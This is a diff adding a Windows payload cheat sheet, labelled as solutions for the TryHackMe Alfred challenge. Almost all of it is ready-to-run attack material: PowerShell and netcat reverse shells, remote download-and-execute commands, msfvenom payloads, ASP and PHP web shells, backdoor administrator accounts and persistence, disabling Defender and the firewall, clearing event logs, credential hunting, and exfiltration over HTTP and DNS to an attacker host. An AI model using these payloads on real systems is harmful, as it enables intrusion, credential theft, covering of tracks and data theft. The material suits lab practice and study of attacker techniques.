@@ -1,0 +1,276 @@
+# TryHackMe Alfred - Payload Collection
+# Educational Use Only - CTF Solutions
+# Date: September 2025
+
+# =========================================
+# JENKINS PAYLOADS
+# =========================================
+
+# Basic Windows Command Execution
+# Use in Jenkins build steps
+whoami
+ipconfig
+net users
+systeminfo
+dir C:\
+
+# PowerShell Reverse Shell - One Liner (Replace IP and PORT)
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.0.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# PowerShell Reverse Shell - Base64 Encoded
+# First encode the payload, then use:
+powershell -enc <BASE64_ENCODED_PAYLOAD>
+
+# Alternative PowerShell Reverse Shell
+powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.8.0.100/shell.ps1')"
+
+# Netcat Windows Binary Upload and Execution
+certutil -urlcache -split -f http://10.8.0.100/nc.exe C:\Windows\Temp\nc.exe
+C:\Windows\Temp\nc.exe 10.8.0.100 4444 -e cmd.exe
+
+# =========================================
+# PRIVILEGE ESCALATION PAYLOADS
+# =========================================
+
+# Check Current Privileges
+whoami /priv
+whoami /groups
+net user %username%
+
+# Token Impersonation Check
+whoami /priv | findstr "SeImpersonatePrivilege"
+whoami /priv | findstr "SeAssignPrimaryTokenPrivilege"
+
+# Service Enumeration
+sc query
+sc query type= service state= all
+wmic service get name,displayname,pathname,startmode
+
+# Find Unquoted Service Paths
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v '"'
+
+# Check Service Permissions
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+accesschk.exe -aucqv <SERVICE_NAME> /accepteula
+
+# Registry Service Configuration Check
+reg query HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE_NAME> /s
+
+# =========================================
+# WINDOWS ENUMERATION PAYLOADS
+# =========================================
+
+# System Information
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+hostname
+
+# Network Information
+ipconfig /all
+route print
+arp -A
+netstat -ano
+
+# User and Group Information
+net users
+net localgroup
+net localgroup administrators
+query user
+
+# Process Information
+tasklist /svc
+wmic process list full
+get-process | select processname,path
+
+# Scheduled Tasks
+schtasks /query /fo LIST /v
+dir C:\windows\tasks
+
+# Installed Software
+wmic product get name,version,vendor
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\
+
+# Environment Variables
+set
+echo %PATH%
+echo %USERNAME%
+echo %COMPUTERNAME%
+
+# =========================================
+# FILE SYSTEM ENUMERATION
+# =========================================
+
+# Search for Interesting Files
+dir /s *pass*
+dir /s *cred*
+dir /s *vnc*
+dir /s *.config
+dir /s *.xml
+dir /s *.txt
+dir /s *.log
+
+# Common Credential Locations
+type C:\Windows\Panther\Unattend.xml
+type C:\Windows\Panther\Unattended.xml
+type C:\Windows\system32\sysprep.inf
+type C:\Windows\system32\sysprep\sysprep.xml
+
+# Registry Credential Hunting
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# =========================================
+# METASPLOIT PAYLOADS
+# =========================================
+
+# Generate Windows Reverse Shell
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.100 LPORT=4444 -f exe > shell.exe
+
+# Generate Windows Meterpreter
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.0.100 LPORT=4444 -f exe > meter.exe
+
+# PowerShell Meterpreter
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.0.100 LPORT=4444 -f psh -o shell.ps1
+
+# =========================================
+# WEB SHELLS
+# =========================================
+
+# Simple CMD Web Shell (ASP)
+<%eval request("cmd")%>
+
+# Simple PHP Web Shell
+<?php system($_GET['cmd']); ?>
+
+# PowerShell Web Shell Download
+certutil -urlcache -split -f http://10.8.0.100/webshell.aspx C:\inetpub\wwwroot\shell.aspx
+
+# =========================================
+# PERSISTENCE PAYLOADS
+# =========================================
+
+# Create New User
+net user hacker password123 /add
+net localgroup administrators hacker /add
+
+# Registry Persistence
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
+
+# Scheduled Task Persistence
+schtasks /create /sc minute /mo 5 /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /ru system
+
+# Service Persistence
+sc create backdoor binpath= "C:\Windows\Temp\backdoor.exe" start= auto
+sc start backdoor
+
+# =========================================
+# DEFENSE EVASION
+# =========================================
+
+# Disable Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring $true
+powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+# Clear Event Logs
+wevtutil cl Application
+wevtutil cl System
+wevtutil cl Security
+
+# Disable Firewall
+netsh advfirewall set allprofiles state off
+
+# =========================================
+# LATERAL MOVEMENT
+# =========================================
+
+# SMB Enumeration
+net view
+net view /domain
+net view \\<TARGET_IP>
+
+# RDP Enable
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh firewall set service remotedesktop enable
+
+# WMI Command Execution (Remote)
+wmic /node:<TARGET_IP> /user:<DOMAIN>\<USER> /password:<PASS> process call create "cmd.exe /c <COMMAND>"
+
+# PSExec Alternative
+psexec \\<TARGET_IP> -u <USER> -p <PASS> cmd
+
+# =========================================
+# DATA EXFILTRATION
+# =========================================
+
+# Simple HTTP Exfiltration
+certutil -encode secret.txt secret.b64
+curl -d @secret.b64 http://10.8.0.100:8000/
+
+# PowerShell Web Request
+Invoke-WebRequest -Uri "http://10.8.0.100:8000/" -Method POST -Body $(Get-Content secret.txt)
+
+# DNS Exfiltration
+nslookup $(Get-Content secret.txt | Out-String -Stream | ForEach-Object {$_.Replace(' ','')}).attacker.com
+
+# =========================================
+# CLEANUP COMMANDS
+# =========================================
+
+# Delete Files
+del C:\Windows\Temp\*.exe
+del C:\Windows\Temp\*.ps1
+del C:\Windows\Temp\*.bat
+
+# Clear Command History
+doskey /history > nul
+clear
+
+# Remove Created Users
+net user hacker /delete
+
+# Remove Registry Entries
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
+
+# Remove Scheduled Tasks
+schtasks /delete /tn "WindowsUpdate" /f
+
+# Remove Services
+sc delete backdoor
+
+# =========================================
+# LISTENER COMMANDS (For Reference)
+# =========================================
+
+# Netcat Listener
+# nc -lvnp 4444
+
+# Metasploit Listener
+# use exploit/multi/handler
+# set payload windows/meterpreter/reverse_tcp
+# set LHOST 10.8.0.100
+# set LPORT 4444
+# exploit
+
+# PowerShell Listener (Simple)
+# $listener = [System.Net.Sockets.TcpListener]4444; $listener.start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); $listener.Stop()
+
+# =========================================
+# NOTES
+# =========================================
+
+# Remember to:
+# 1. Replace IP addresses with your actual attacking machine IP
+# 2. Replace ports with your chosen listener ports
+# 3. Use these payloads responsibly and only on authorized systems
+# 4. Clean up after testing to avoid detection
+# 5. Document your findings for learning purposes
+
+# Educational Disclaimer:
+# These payloads are provided for educational purposes only.
+# Only use on systems you own or have explicit permission to test.
+# Unauthorized access to computer systems is illegal.
+
+# Challenge Context:
+# These payloads are specifically designed for the TryHackMe Alfred challenge
+# and demonstrate common Windows exploitation techniques in a controlled environment.
